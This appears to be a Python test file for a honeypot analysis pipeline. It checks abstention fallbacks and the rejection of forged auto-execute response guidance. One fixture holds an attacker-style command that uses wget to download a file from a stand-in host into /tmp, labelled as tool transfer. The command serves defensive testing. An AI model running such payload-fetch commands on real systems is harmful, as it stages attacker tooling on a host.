from __future__ import annotations

import copy

from production.api.monitor_web import _historical_response_guidance_payload
from production.reporting.response_guidance_v3 import (
    build_response_guidance_v3_from_session,
)
from production.reporting.session_assessment_v4 import (
    validate_session_assessment_v4,
)
from production.workers.analysis_worker import deterministic_baseline_report


def _session() -> dict:
    return {
        "session_id": "phase0-authority",
        "src_ip": "203.0.113.44",
        "commands": ["whoami"],
        "commands_success": ["whoami"],
        "commands_failed": [],
        "classification_events": [],
        "raw_events": [
            {
                "session": "phase0-authority",
                "src_ip": "203.0.113.44",
                "timestamp": "2026-07-28T00:00:00Z",
                "eventid": "cowrie.command.input",
                "input": "whoami",
            }
        ],
    }


def test_terminal_analysis_fallback_is_current_observation_only_abstention() -> None:
    report = deterministic_baseline_report(
        _session(),
        "RuntimeError: operation_failed",
    )

    assert report["schema_version"] == "session_assessment.v6"
    assert report["status"] == "observation_only_abstention"
    assert report["abstention"] == {
        "abstained": True,
        "reason": "analysis_pipeline_failed",
    }
    assert report["behavioral_findings"] == []
    assert report["hypothesis_sets"] == []
    assert "threat_hypothesis" not in report
    assert "predicted_next_action" not in str(report)
    from production.reporting.session_assessment_v6 import (
        validate_session_assessment_v6,
    )
    assert validate_session_assessment_v6(report) == []


def test_terminal_fallback_rebinds_id_after_suppressing_supported_findings() -> None:
    session = _session()
    command = "wget https://example.invalid/a -O /tmp/a"
    session["commands"] = [command]
    session["classification_events"] = [
        {
            "command": command,
            "original_command": command,
            "ttp": "T1105",
            "tactic": "command-and-control",
            "source": "rule",
            "high_confidence": True,
            "evidence_id": "classification-transfer",
            "event_timestamp": "2026-07-28T00:00:00Z",
            "cowrie_eventid": "cowrie.command.input",
        }
    ]
    session["raw_events"][0]["input"] = command

    report = deterministic_baseline_report(session, "controlled failure")

    assert report["behavioral_findings"] == []
    assert report["hypothesis_sets"] == []
    from production.reporting.session_assessment_v6 import (
        validate_session_assessment_v6,
    )
    assert validate_session_assessment_v6(report) == []


def test_invalid_stored_v3_guidance_is_non_actionable() -> None:
    guidance = build_response_guidance_v3_from_session(_session())
    forged = copy.deepcopy(guidance)
    forged["advisory_actions"] = [
        {
            "action_id": "forged",
            "description": "execute automatically",
            "requires_manual_approval": False,
            "safe_to_auto_execute": True,
        }
    ]

    historical = _historical_response_guidance_payload(
        {"response_guidance_v3": forged}
    )

    assert historical["status"] == "invalid_stored_guidance"
    assert historical["advisory_actions"] == []
    assert historical["authoritative_for_new_actions"] is False
